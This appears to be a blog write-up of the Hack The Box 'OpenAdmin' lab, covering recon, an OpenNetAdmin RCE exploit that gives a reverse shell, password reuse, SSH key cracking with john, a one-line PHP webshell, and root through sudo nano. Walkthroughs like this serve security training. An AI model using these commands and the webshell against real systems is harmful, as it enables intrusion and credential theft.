<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Writeup] Hack The Box: OpenAdmin | ErbaZZ's Space</title><meta name=keywords content="writeup,walkthrough,htb,hackthebox"><meta name=description content="Let&rsquo;s pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.

"><meta name=author content="ErbaZZ"><link rel=canonical href=https://erbazz.me/writeup/htb_openadmin/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://erbazz.me/favicon.ico><link rel=apple-touch-icon href=https://erbazz.me/favicon.ico><link rel=mask-icon href=https://erbazz.me/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[Writeup] Hack The Box: OpenAdmin"><meta property="og:description" content="Let&rsquo;s pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.

"><meta property="og:type" content="article"><meta property="og:url" content="https://erbazz.me/writeup/htb_openadmin/"><meta property="og:image" content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="writeup"><meta property="article:published_time" content="2020-04-29T23:39:12+07:00"><meta property="article:modified_time" content="2020-04-29T23:39:12+07:00"><meta property="og:site_name" content="ErbaZZ's Space"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Writeup] Hack The Box: OpenAdmin"><meta name=twitter:description content="Let&rsquo;s pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.

"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://erbazz.me/writeup/"},{"@type":"ListItem","position":2,"name":"[Writeup] Hack The Box: OpenAdmin","item":"https://erbazz.me/writeup/htb_openadmin/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Writeup] Hack The Box: OpenAdmin","name":"[Writeup] Hack The Box: OpenAdmin","description":"Let\u0026rsquo;s pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.\n","keywords":["writeup","walkthrough","htb","hackthebox"],"articleBody":"Let’s pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.\nOS: Linux\nDifficulty: Easy\nPoints: 20\nRelease: 04 Jan 2020\nIP: 10.10.10.171\nDate Cleared: 20 Apr 2020\nสำหรับ Writeup ภาษาไทย กดที่ Link นี้ได้เลยครับ\nInformation Gathering Starting with nmap as usual, we can see that there are two open ports, ssh on 22, and http on 80.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80 On port 80, there is an Apache2 Default Page on the home page.\nUsing gobuster, several interesting paths were found.\nAfter accessing them one by one, we can see that they are just static template webpages with placeholder text.\nHowever, on the music page, the Login button links to http://10.10.10.171/ona. The page is hosting OpenNetAdmin 18.1.1.\nUsing Google search, we can see that the version is vulnerable to RCE.\nExploitation I downloaded an exploit script from https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py and run it with the command python3 ona-rce.py exploit http://10.10.10.171/ona/ to get a reverse shell.\nDigging through the files, I found an interesting config file containing db password n1nj4W4rri0R!.\nLooking at the home directory, we can see two users, jimmy and joanna. I was able to login with the user jimmy using the password found.\nAt this point, I just used ssh to connect to the server and dig further.\nI then found an interesting path, /var/www/internal, owned by jimmy.\nThe index.php page contains a login form. The username must be jimmy, and the sha512 hash of the password must match.\nThe main.php page prints out the private key of joanna.\nNow can roughly guess the steps we need to take. Find the correct password, log in, get the private key, and use the key to login as joanna.\nStarting from the password, I used https://crackstation.net/ to crack the hash, and found that the password is Revealed.\nTo log in, we need to know the port that these pages are hosted on. Knowing that the web server is apache, we can find the configuration files in /etc/apache2/. I found that the /var/www/internal path is hosted on port 52846.\nRemember the nmap result? Yes, the port 52846 is not open from the outside, so we can only access it internally from the target machine using curl.\nHowever, there’s a twist! Let’s look at the source code of main.php again.\nphp session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /index.php\"); }; # Open Admin Trusted # OpenAdmin $output = shell_exec('cat /home/joanna/.ssh/id_rsa'); echo \"$output\"; ? Don't forget your \"ninja\" password Click here to logout Session  The private key would be printed whether we are logged in or not! We would just be redirected to index.php if we are not logged in. Therefore, we can just curl main.php to get the private key, no username or password needed.\nSo, what if we want to access the internal website from a web browser on our machine? Local Port Forwarding is the answer.\nThe command to do Local Port Forwarding is ssh -L local_port:destination_ip:destination_port username@ssh_server_ip.\nAs we already know the credential of jimmy (username), we can use ssh to forward the connection from a port on our machine, such as 80 (local_port), through the ssh server on 10.10.10.171 (ssh_server_ip), to the destination host at 127.0.0.1 (destination_ip) on port 52846 (destination_port). This means that the ssh server host would forward the connection to itself, allowing us to connect to a locally hosted web server.\nThe command is ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171.\nWith the port forwarding done. we can now use the web browser to connect to port 80 on our machine to reach the web server.\nLogging in with jimmy:Revealed.\nAs planned, we now have the private key of joanna.\nI copied the private key into a file name privkey. We can use the key to ssh to the target with the user joanna using the command ssh -i privkey joanna@10.10.10.171 … or not?\nThe private key is protected with a passphrase!\nBut what is the passphrase? Let’s try cracking it using john and our beloved wordlist, rockyou.txt.\nWe can convert the private key into the format usable by john with the command python /usr/share/jogn/ssh2john.py privkey  privkey.hash, then crack it using the command john privkey.hash --wordlist=/usr/share/wordlists/rockyou.txt.\nAnd the result? Success!\nWe can finally ssh to the target using the private key and the passphrase bloodninjas.\nAnother Solution There’s another method to access joanna. If we go back, we can see that jimmy own the /var/www/internal directory and all the files inside, so we can edit the existing files, or write new files there.\nWe can create a simple command execution webshell named cmd.php in the directory using echo ''  cmd.php. Then we can curl to the page with our command in cmd parameter using curl localhost:52846/cmd.php?cmd=[COMMAND] to run arbitrary commands as joanna.\nWe can use this method to get the private key, or put our public key inside /home/joanna/.ssh/authorized_keys to gain access to the machine.\nPrivilege Escalation The escalation steps for this box is quite straightforward. Using sudo -l, we can see that nano can be run as root without password needed.\nWith the information from https://gtfobins.github.io/gtfobins/nano/, it’s clear that sudo with nano is a nono, allowing a low-privilege user to escalate to root easily.\nRunning nano with elevated permission.\nPressing Ctrl-R, then Ctrl-X to execute command.\nType reset; sh 1\u00260 2\u00260, then press Enter.\nTap Enter a few times to clear the screen, and here we go, rooted!\n","wordCount":"968","inLanguage":"en","datePublished":"2020-04-29T23:39:12+07:00","dateModified":"2020-04-29T23:39:12+07:00","author":{"@type":"Person","name":"ErbaZZ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://erbazz.me/writeup/htb_openadmin/"},"publisher":{"@type":"Organization","name":"ErbaZZ's Space","logo":{"@type":"ImageObject","url":"https://erbazz.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://erbazz.me/ accesskey=h title="ErbaZZ's Space (Alt + H)"><img src=https://erbazz.me/apple-touch-icon.png alt aria-label=logo height=35>ErbaZZ's Space</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://erbazz.me/ title=Home><span>Home</span></a></li><li><a href=https://erbazz.me/writeup/ title=Writeup><span>Writeup</span></a></li><li><a href=https://erbazz.me/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://erbazz.me/>Home</a>&nbsp;»&nbsp;<a href=https://erbazz.me/writeup/>Writeups</a></div><h1 class=post-title>[Writeup] Hack The Box: OpenAdmin</h1><div class=post-meta><span title="2020-04-29 23:39:12 +0700 +07">April 29, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;968 words&nbsp;·&nbsp;ErbaZZ</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#port-80>Port 80</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#another-solution>Another Solution</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></details></div><div class=post-content><p>Let&rsquo;s pwn OpenAdmin from Hack The Box. This box is quite easy, as there are multiple ways to get the user flag. One part of the solution I used below is too easy in my opinion, as it could be caused by the overlook of the box creator.</p><p><img loading=lazy src=/images/htb_openadmin/infocard.png alt></p><p><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Easy<br><strong>Points:</strong> 20<br><strong>Release:</strong> 04 Jan 2020<br><strong>IP:</strong> 10.10.10.171<br><strong>Date Cleared:</strong> 20 Apr 2020</p><p><strong><a href=/writeup/htb_openadmin_th/>สำหรับ Writeup ภาษาไทย กดที่ Link นี้ได้เลยครับ</a></strong></p><h2 id=information-gathering>Information Gathering<a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>Starting with <code>nmap</code> as usual, we can see that there are two open ports, <code>ssh</code> on 22, and <code>http</code> on <code>80</code>.</p><pre tabindex=0><code>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id=port-80>Port 80<a hidden class=anchor aria-hidden=true href=#port-80>#</a></h3><p>On port <code>80</code>, there is an Apache2 Default Page on the home page.</p><p><img loading=lazy src=/images/htb_openadmin/80_home.png alt></p><p>Using <code>gobuster</code>, several interesting paths were found.</p><p><img loading=lazy src=/images/htb_openadmin/80_gobuster.png alt></p><p>After accessing them one by one, we can see that they are just static template webpages with placeholder text.</p><p><img loading=lazy src=/images/htb_openadmin/80_artwork.png alt></p><p><img loading=lazy src=/images/htb_openadmin/80_sierra.png alt></p><p><img loading=lazy src=/images/htb_openadmin/80_music.png alt></p><p>However, on the music page, the Login button links to <a href=http://10.10.10.171/ona>http://10.10.10.171/ona</a>. The page is hosting <code>OpenNetAdmin 18.1.1</code>.</p><p><img loading=lazy src=/images/htb_openadmin/80_ona.png alt></p><p>Using Google search, we can see that the version is vulnerable to RCE.</p><p><img loading=lazy src=/images/htb_openadmin/ona_rce.png alt></p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>I downloaded an exploit script from <a href=https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py>https://raw.githubusercontent.com/amriunix/ona-rce/master/ona-rce.py</a> and run it with the command <code>python3 ona-rce.py exploit http://10.10.10.171/ona/</code> to get a reverse shell.</p><p><img loading=lazy src=/images/htb_openadmin/80_ona_rev.png alt></p><p>Digging through the files, I found an interesting config file containing db password <code>n1nj4W4rri0R!</code>.</p><p><img loading=lazy src=/images/htb_openadmin/dbsetting.png alt></p><p>Looking at the home directory, we can see two users, <code>jimmy</code> and <code>joanna</code>. I was able to login with the user <code>jimmy</code> using the password found.</p><p><img loading=lazy src=/images/htb_openadmin/user.png alt></p><p>At this point, I just used <code>ssh</code> to connect to the server and dig further.</p><p>I then found an interesting path, <code>/var/www/internal</code>, owned by <code>jimmy</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal.png alt></p><p>The <code>index.php</code> page contains a login form. The username must be <code>jimmy</code>, and the <code>sha512</code> hash of the password must match.</p><p><img loading=lazy src=/images/htb_openadmin/internal_index.png alt></p><p>The <code>main.php</code> page prints out the private key of <code>joanna</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal_main.png alt></p><p>Now can roughly guess the steps we need to take. Find the correct password, log in, get the private key, and use the key to login as <code>joanna</code>.</p><p>Starting from the password, I used <a href=https://crackstation.net/>https://crackstation.net/</a> to crack the hash, and found that the password is <code>Revealed</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal_index_crack.png alt></p><p>To log in, we need to know the port that these pages are hosted on. Knowing that the web server is <code>apache</code>, we can find the configuration files in <code>/etc/apache2/</code>. I found that the <code>/var/www/internal</code> path is hosted on port <code>52846</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal_apache.png alt></p><p>Remember the <code>nmap</code> result? Yes, the port <code>52846</code> is not open from the outside, so we can only access it internally from the target machine using <code>curl</code>.</p><p><strong>However, there&rsquo;s a twist!</strong> Let&rsquo;s look at the source code of <code>main.php</code> again.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>session_start</span><span class=p>();</span> <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span> <span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]))</span> <span class=p>{</span> <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /index.php&#34;</span><span class=p>);</span> <span class=p>};</span> 
</span></span><span class=line><span class=cl><span class=c1># Open Admin Trusted
</span></span></span><span class=line><span class=cl><span class=c1># OpenAdmin
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$output</span> <span class=o>=</span> <span class=nx>shell_exec</span><span class=p>(</span><span class=s1>&#39;cat /home/joanna/.ssh/id_rsa&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;</span><span class=si>$output</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
</span></span></span><span class=line><span class=cl><span class=err>Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
</span></span></span><span class=line><span class=cl><span class=err>&lt;/html&gt;
</span></span></span></code></pre></div><p>The private key would be printed whether we are logged in or not! We would just be redirected to <code>index.php</code> if we are not logged in. Therefore, we can just curl <code>main.php</code> to get the private key, no username or password needed.</p><p><img loading=lazy src=/images/htb_openadmin/internal_curlpriv.png alt></p><p>So, what if we want to access the internal website from a web browser on our machine? <code>Local Port Forwarding</code> is the answer.</p><p>The command to do <code>Local Port Forwarding</code> is <code>ssh -L local_port:destination_ip:destination_port username@ssh_server_ip</code>.</p><p>As we already know the credential of <code>jimmy</code> (username), we can use <code>ssh</code> to forward the connection from a port on our machine, such as <code>80</code> (local_port), through the ssh server on <code>10.10.10.171</code> (ssh_server_ip), to the destination host at <code>127.0.0.1</code> (destination_ip) on port <code>52846</code> (destination_port). This means that the ssh server host would forward the connection to itself, allowing us to connect to a locally hosted web server.</p><p>The command is <code>ssh -L 80:127.0.0.1:52846 jimmy@10.10.10.171</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal_localforward.png alt></p><p>With the port forwarding done. we can now use the web browser to connect to port <code>80</code> on our machine to reach the web server.</p><p><img loading=lazy src=/images/htb_openadmin/internal_localhost.png alt></p><p>Logging in with <code>jimmy:Revealed</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal_login.png alt></p><p>As planned, we now have the private key of <code>joanna</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal_privkey.png alt></p><p>I copied the private key into a file name <code>privkey</code>. We can use the key to <code>ssh</code> to the target with the user <code>joanna</code> using the command <code>ssh -i privkey joanna@10.10.10.171</code> &mldr; or not?</p><p>The private key is protected with a passphrase!</p><p><img loading=lazy src=/images/htb_openadmin/joanna_pass.png alt></p><p>But what is the passphrase? Let&rsquo;s try cracking it using <code>john</code> and our beloved wordlist, <code>rockyou.txt</code>.</p><p>We can convert the private key into the format usable by <code>john</code> with the command <code>python /usr/share/jogn/ssh2john.py privkey > privkey.hash</code>, then crack it using the command <code>john privkey.hash --wordlist=/usr/share/wordlists/rockyou.txt</code>.</p><p>And the result? Success!</p><p><img loading=lazy src=/images/htb_openadmin/internal_privkey_crack.png alt></p><p>We can <em>finally</em> <code>ssh</code> to the target using the private key and the passphrase <code>bloodninjas</code>.</p><p><img loading=lazy src=/images/htb_openadmin/joanna_ssh.png alt></p><h3 id=another-solution>Another Solution<a hidden class=anchor aria-hidden=true href=#another-solution>#</a></h3><p>There&rsquo;s another method to access <code>joanna</code>. If we go back, we can see that <code>jimmy</code> own the <code>/var/www/internal</code> directory and all the files inside, so we can edit the existing files, or write new files there.</p><p><img loading=lazy src=/images/htb_openadmin/internal.png alt></p><p>We can create a simple command execution webshell named <code>cmd.php</code> in the directory using <code>echo '&lt;?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php</code>. Then we can <code>curl</code> to the page with our command in <code>cmd</code> parameter using <code>curl localhost:52846/cmd.php?cmd=[COMMAND]</code> to run arbitrary commands as <code>joanna</code>.</p><p><img loading=lazy src=/images/htb_openadmin/internal_joannacmd.png alt></p><p>We can use this method to get the private key, or put our public key inside <code>/home/joanna/.ssh/authorized_keys</code> to gain access to the machine.</p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>The escalation steps for this box is quite straightforward. Using <code>sudo -l</code>, we can see that <code>nano</code> can be run as <code>root</code> without password needed.</p><p><img loading=lazy src=/images/htb_openadmin/joanna_nano.png alt></p><p>With the information from <a href=https://gtfobins.github.io/gtfobins/nano/>https://gtfobins.github.io/gtfobins/nano/</a>, it&rsquo;s clear that <code>sudo</code> with <code>nano</code> is a <code>nono</code>, allowing a low-privilege user to escalate to <code>root</code> easily.</p><p><img loading=lazy src=/images/htb_openadmin/gtfobins.png alt></p><p>Running <code>nano</code> with elevated permission.</p><p><img loading=lazy src=/images/htb_openadmin/priv1.png alt></p><p>Pressing <code>Ctrl-R</code>, then <code>Ctrl-X</code> to execute command.</p><p><img loading=lazy src=/images/htb_openadmin/priv2.png alt></p><p>Type <code>reset; sh 1>&0 2>&0</code>, then press <code>Enter</code>.</p><p><img loading=lazy src=/images/htb_openadmin/priv3.png alt></p><p>Tap <code>Enter</code> a few times to clear the screen, and here we go, rooted!</p><p><img loading=lazy src=/images/htb_openadmin/root.png alt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://erbazz.me/tags/writeup/>writeup</a></li><li><a href=https://erbazz.me/tags/walkthrough/>walkthrough</a></li><li><a href=https://erbazz.me/tags/htb/>htb</a></li><li><a href=https://erbazz.me/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=prev href=https://erbazz.me/writeup/htb_monteverde/><span class=title>« Prev</span><br><span>[Writeup] Hack The Box: Monteverde</span></a>
<a class=next href=https://erbazz.me/writeup/htb_openadmin_th/><span class=title>Next »</span><br><span>[Writeup] Hack The Box: OpenAdmin (Thai Version)</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://erbazz.me/>ErbaZZ's Space</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerHTML="copy";function s(){e.innerHTML="copied!",setTimeout(()=>{e.innerHTML="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>